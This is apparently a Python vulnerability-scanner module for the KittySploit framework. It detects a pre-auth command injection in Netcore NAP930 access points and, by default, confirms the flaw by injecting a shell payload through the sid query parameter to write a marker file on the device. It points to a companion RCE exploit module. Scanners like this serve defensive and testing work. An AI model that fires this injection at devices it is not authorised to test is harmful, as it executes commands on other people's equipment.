#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Netcore NAP930 CVE-2026-102240 network_tools command injection."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Netcore NAP930 CVE-2026-102240 Detect",
        "description": (
            "Detects CVE-2026-102240 in Netcore NAP930 access points: pre-auth "
            "command injection in /cgi-bin/network_tools via eval on raw QUERY_STRING "
            "before the sid session check. Confirms endpoint presence and optionally "
            "writes a marker file to /www/ when active_probe is enabled."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-102240"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-102240",
            "https://github.com/senxitoyshuyi-ui/HACKALL",
        ],
        "modules": ["exploits/linux/http/netcore_nap930_cve_2026_102240_rce"],
        "tags": [
            "web",
            "scanner",
            "netcore",
            "router",
            "access-point",
            "cmdi",
            "unauth",
            "cve-2026-102240",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.2,
            "noise": 0.45,
            "value": 1.0,
            "chain": {
                "produces_capabilities": [
                    {"capability": "rce", "from_detail": "network_tools eval sid"},
                ],
                "suggested_followups": [
                    "exploits/linux/http/netcore_nap930_cve_2026_102240_rce",
                ],
            },
        },
    }

    active_probe = OptBool(
        True,
        "Confirm by writing echo marker under /www/ and fetching it",
        False,
    )

    def _network_tools(self, sid_value: str):
        # Raw quotes/semicolons required — uhttpd passes QUERY_STRING verbatim.
        path = f"/cgi-bin/network_tools?sid={sid_value}"
        return self.http_request(method="GET", path=path, allow_redirects=False)

    def _nap930_present(self) -> bool:
        for path in ("/", "/login.html"):
            response = self.http_request(method="GET", path=path, allow_redirects=True)
            if not response:
                continue
            body = (response.text or "").lower()
            if "nap930" in body or "netcore" in body:
                return True
        return False

    def run(self):
        baseline = self._network_tools("01234567890123456789012345678901")
        if not baseline:
            return False
        body = baseline.text or ""
        if '"result"' not in body and "jsonrpc" not in body:
            if not self._nap930_present():
                return False

        if bool(self.active_probe):
            marker = f"kitty{secrets.token_hex(4)}"
            outfile = f"/www/.{marker}.txt"
            inject = f"';echo${{IFS}}{marker}>${{IFS}}{outfile};:'"
            self._network_tools(inject)
            fetch = self.http_request(method="GET", path=f"/.{marker}.txt", allow_redirects=False)
            if fetch and marker in (fetch.text or ""):
                self.http_request(method="GET", path=f"/.{marker}.txt", allow_redirects=False)
                self.set_info(
                    severity="critical",
                    cve="CVE-2026-102240",
                    reason="Netcore NAP930 network_tools pre-auth command injection confirmed",
                    path="/cgi-bin/network_tools",
                    marker=marker,
                )
                return True

        if re.search(r'"result"\s*:\s*\[\s*6\s*\]', body):
            self.set_info(
                severity="high",
                cve="CVE-2026-102240",
                reason=(
                    "Netcore NAP930 network_tools endpoint responds with result:[6] "
                    "(pre-auth eval path reachable — enable active_probe to confirm RCE)"
                ),
                path="/cgi-bin/network_tools",
            )
            return True
        return False
